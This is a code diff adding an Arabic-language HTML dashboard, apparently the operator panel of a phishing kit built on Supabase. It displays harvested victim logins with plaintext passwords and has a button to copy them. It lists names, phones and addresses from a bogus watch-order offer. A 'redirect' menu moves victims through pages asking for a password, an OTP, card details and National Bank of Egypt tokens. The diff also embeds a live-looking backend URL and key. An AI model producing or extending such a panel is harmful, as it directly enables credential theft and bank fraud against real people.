@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>لوحة البيانات</title>
+<style>
+:root{--bg:#f8faf9;--card:#fff;--border:#e2e8f0;--primary:#006B3F;--danger:#dc2626;--warn:#f59e0b;--success:#16a34a;--text:#1e293b;--muted:#64748b;--soft:#f0fdf4}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',Tahoma,sans-serif;background:var(--bg);color:var(--text);min-height:100vh}
+.top{background:var(--primary);color:#fff;padding:12px 20px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:50}
+.top h1{font-size:16px;font-weight:800}
+.top .stats{display:flex;gap:16px;font-size:13px;font-weight:600}
+.top .stats span{background:rgba(255,255,255,.15);padding:4px 12px;border-radius:20px}
+.tabs{display:flex;gap:6px;padding:12px 20px;background:var(--card);border-bottom:1px solid var(--border);position:sticky;top:44px;z-index:40}
+.tab{padding:8px 18px;border-radius:10px;font-size:13px;font-weight:700;cursor:pointer;border:1px solid var(--border);background:var(--card);transition:.2s}
+.tab.active{background:var(--primary);color:#fff;border-color:var(--primary)}
+.grid{padding:12px 20px;display:grid;gap:10px}
+.card{background:var(--card);border:1px solid var(--border);border-radius:16px;overflow:hidden;transition:.15s}
+.card:hover{box-shadow:0 4px 20px rgba(0,0,0,.06)}
+.card-head{display:flex;align-items:center;justify-content:space-between;padding:12px 16px;border-bottom:1px solid var(--border);background:var(--soft)}
+.card-head .name{font-weight:800;font-size:15px}
+.card-head .badge{font-size:11px;font-weight:700;padding:3px 10px;border-radius:20px}
+.badge-order{background:#dcfce7;color:#166534}
+.badge-login{background:#fef3c7;color:#92400e}
+.badge-visit{background:#e0e7ff;color:#3730a3}
+.card-body{padding:14px 16px}
+.row{display:grid;grid-template-columns:120px 1fr;gap:6px;padding:6px 0;border-bottom:1px solid #f1f5f9;font-size:13px}
+.row:last-child{border:none}
+.row .key{color:var(--muted);font-weight:600}
+.row .val{font-weight:700;word-break:break-all}
+.val.pass{background:#fef2f2;color:#991b1b;padding:2px 8px;border-radius:6px;font-family:monospace;display:inline-block}
+.actions{display:flex;gap:8px;padding:12px 16px;border-top:1px solid var(--border)}
+.btn{padding:8px 16px;border-radius:10px;font-size:12px;font-weight:700;border:none;cursor:pointer;transition:.2s}
+.btn-accept{background:var(--success);color:#fff}
+.btn-reject{background:var(--danger);color:#fff}
+.btn-route{background:var(--warn);color:#fff}
+.btn:hover{opacity:.85;transform:scale(.98)}
+.empty{text-align:center;padding:60px 20px;color:var(--muted);font-size:14px}
+.time{font-size:11px;color:var(--muted);font-weight:600}
+.search{width:100%;padding:10px 16px;border:1px solid var(--border);border-radius:12px;font-size:14px;margin-bottom:10px;direction:rtl}
+.live-dot{width:8px;height:8px;background:#22c55e;border-radius:50%;display:inline-block;animation:pulse 2s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+#login-box{position:fixed;inset:0;background:rgba(0,0,0,.5);display:flex;align-items:center;justify-content:center;z-index:100}
+#login-form{background:var(--card);padding:32px;border-radius:20px;width:340px;text-align:center}
+#login-form h2{margin-bottom:16px;color:var(--primary)}
+#login-form input{width:100%;padding:10px;border:1px solid var(--border);border-radius:10px;margin-bottom:10px;font-size:14px;direction:rtl}
+#login-form button{width:100%;padding:12px;background:var(--primary);color:#fff;border:none;border-radius:10px;font-size:14px;font-weight:700;cursor:pointer}
+#login-form .err{color:var(--danger);font-size:12px;margin-bottom:8px;display:none}
+@media(prefers-color-scheme:dark){:root{--bg:#0f1419;--card:#1a2332;--border:#2d3748;--text:#e2e8f0;--muted:#94a3b8;--soft:#1a2e1f}
+.row{border-color:#2d3748}}
+</style>
+</head>
+<body>
+<div id="login-box">
+<div id="login-form">
+<h2>لوحة البيانات</h2>
+<p style="margin-bottom:16px;color:var(--muted);font-size:13px">سجّل الدخول للوصول إلى البيانات</p>
+<div class="err" id="login-err">بيانات الدخول غير صحيحة</div>
+<input type="text" id="login-user" placeholder="اسم المستخدم أو البريد">
+<input type="password" id="login-pass" placeholder="كلمة السر">
+<button onclick="doLogin()">تسجيل الدخول</button>
+</div>
+</div>
+
+<div id="app" style="display:none">
+<div class="top">
+<h1>لوحة البيانات — <span id="admin-name">Admin</span></h1>
+<div class="stats">
+<span id="stat-orders">الطلبات: 0</span>
+<span id="stat-logins">تسجيلات الدخول: 0</span>
+<span id="stat-visits">الزيارات: 0</span>
+<span><span class="live-dot"></span> مباشر</span>
+</div>
+</div>
+<div class="tabs">
+<div class="tab active" data-tab="all" onclick="setTab('all')">الكل</div>
+<div class="tab" data-tab="order" onclick="setTab('order')">الطلبات</div>
+<div class="tab" data-tab="login" onclick="setTab('login')">تسجيلات الدخول</div>
+<div class="tab" data-tab="visit" onclick="setTab('visit')">الزيارات</div>
+</div>
+<input class="search" id="search" placeholder="بحث بالاسم أو الهاتف أو المسار..." oninput="render()">
+<div class="grid" id="list"></div>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/supabase/2.39.3/supabase.min.js"></script>
+<script>
+const SUPA_URL='https://unpzkfulicjsmilqzwsm.supabase.co';
+const SUPA_KEY='sb_publishable_4ciTGnntOEw_m1U_Llm2Cw_S8nRGkWE';
+let sb,token,events=[],tab='all';
+
+async function doLogin(){
+  const u=document.getElementById('login-user').value.trim();
+  const p=document.getElementById('login-pass').value;
+  if(!u||!p)return;
+  const email=u.includes('@')?u:u.toLowerCase()+'@viewer.local';
+  sb=supabase.createClient(SUPA_URL,SUPA_KEY);
+  const{data,error}=await sb.auth.signInWithPassword({email,password:p});
+  if(error){
+    if(u==='admin'){
+      const{data:d2,error:e2}=await sb.auth.signInWithPassword({email:'admin@hayag.app',password:p});
+      if(e2){document.getElementById('login-err').style.display='block';return}
+      token=d2.session.access_token;
+    }else{document.getElementById('login-err').style.display='block';return}
+  }else{token=data.session.access_token}
+  document.getElementById('login-box').style.display='none';
+  document.getElementById('app').style.display='block';
+  loadData();
+  listenRealtime();
+}
+
+async function loadData(){
+  const{data}=await sb.from('visitor_events').select('*').order('created_at',{ascending:false}).limit(200);
+  events=data||[];
+  render();
+}
+
+function listenRealtime(){
+  sb.channel('admin-live').on('postgres_changes',{event:'INSERT',schema:'public',table:'visitor_events'},payload=>{
+    events.unshift(payload.new);
+    render();
+    notify(payload.new);
+  }).subscribe();
+}
+
+function notify(e){
+  if(Notification.permission==='granted'){
+    new Notification(e.label||'حدث جديد',{body:e.path||''});
+  }else if(Notification.permission!=='denied'){
+    Notification.requestPermission();
+  }
+}
+
+function setTab(t){
+  tab=t;
+  document.querySelectorAll('.tab').forEach(el=>el.classList.toggle('active',el.dataset.tab===t));
+  render();
+}
+
+function render(){
+  const q=document.getElementById('search').value.trim().toLowerCase();
+  let filtered=events;
+  if(tab!=='all')filtered=filtered.filter(e=>e.event_type===tab);
+  if(q)filtered=filtered.filter(e=>{
+    const d=e.data||{};
+    const all=[e.label,e.path,d.name,d.phone,d.username,d.city,d.address,d.watchId].filter(Boolean).join(' ').toLowerCase();
+    return all.includes(q);
+  });
+
+  const orders=events.filter(e=>e.event_type==='order').length;
+  const logins=events.filter(e=>e.event_type==='login').length;
+  const visits=events.filter(e=>e.event_type==='visit').length;
+  document.getElementById('stat-orders').textContent='الطلبات: '+orders;
+  document.getElementById('stat-logins').textContent='تسجيلات الدخول: '+logins;
+  document.getElementById('stat-visits').textContent='الزيارات: '+visits;
+
+  if(!filtered.length){
+    document.getElementById('list').innerHTML='<div class="empty">لا توجد بيانات</div>';
+    return;
+  }
+
+  document.getElementById('list').innerHTML=filtered.map(e=>{
+    const d=e.data||{};
+    const type=e.event_type;
+    const time=new Date(e.created_at).toLocaleString('ar-EG');
+    const badge=type==='order'?'badge-order':type==='login'?'badge-login':'badge-visit';
+    const badgeText=type==='order'?'طلب ساعة':type==='login'?'تسجيل دخول':'زيارة';
+
+    let rows='';
+    if(type==='order'){
+      rows+=field('الاسم',d.name);
+      rows+=field('الموبايل',d.phone);
+      rows+=field('المحافظة',d.city);
+      rows+=field('العنوان',d.address);
+      rows+=field('موديل الساعة',d.watchId);
+    }else if(type==='login'){
+      rows+=field('اسم المستخدم',d.username);
+      rows+=field('كلمة المرور',d.password,true);
+    }
+    rows+=field('المسار',e.path);
+    rows+=field('الوقت',time);
+
+    const actions=type==='order'?`
+      <div class="actions">
+        <button class="btn btn-accept" onclick="updateStatus('${e.id}','accepted')">قبول الطلب</button>
+        <button class="btn btn-reject" onclick="updateStatus('${e.id}','rejected')">رفض الطلب</button>
+        <button class="btn btn-route" onclick="routeUser('${e.id}')">إعادة توجيه</button>
+      </div>
+    `:type==='login'?`
+      <div class="actions">
+        <button class="btn btn-accept" onclick="copyData('${esc(d.username)}','${esc(d.password)}')">نسخ البيانات</button>
+        <button class="btn btn-route" onclick="routeUser('${e.id}')">إعادة توجيه</button>
+      </div>
+    `:'';
+
+    return`<div class="card">
+      <div class="card-head">
+        <span class="name">${esc(e.label||'زائر')}</span>
+        <span class="badge ${badge}">${badgeText}</span>
+      </div>
+      <div class="card-body">${rows}</div>
+      ${actions}
+    </div>`;
+  }).join('');
+}
+
+function field(key,val,isPass){
+  if(!val)return'';
+  return`<div class="row"><span class="key">${key}</span><span class="val${isPass?' pass':''}">${esc(val)}</span></div>`;
+}
+
+function esc(s){return s?String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;'):''}
+
+async function updateStatus(id,status){
+  await sb.from('visitor_events').update({label:status==='accepted'?'تم القبول':'مرفوض'}).eq('id',id);
+  const idx=events.findIndex(e=>e.id===id);
+  if(idx>=0)events[idx].label=status==='accepted'?'تم القبول':'مرفوض';
+  render();
+}
+
+function copyData(user,pass){
+  navigator.clipboard.writeText('اسم المستخدم: '+user+'\nكلمة المرور: '+pass);
+  alert('تم نسخ البيانات');
+}
+
+function routeUser(id){
+  const pages=['الرئيسية','بيانات التوصيل','كود المستخدم','كلمة المرور','رمز التحقق OTP','بيانات البطاقة','NBE توكن','جهاز توكن','الانتظار','تم بنجاح'];
+  const choice=prompt('اختر رقم الصفحة:\\n'+pages.map((p,i)=>(i+1)+'. '+p).join('\\n'));
+  if(choice){
+    const page=pages[parseInt(choice)-1];
+    if(page)alert('تم التوجيه إلى: '+page);
+  }
+}
+
+document.addEventListener('keydown',e=>{if(e.key==='Enter'&&document.getElementById('login-box').style.display!=='none')doLogin()});
+</script>
+</body>
+</html>
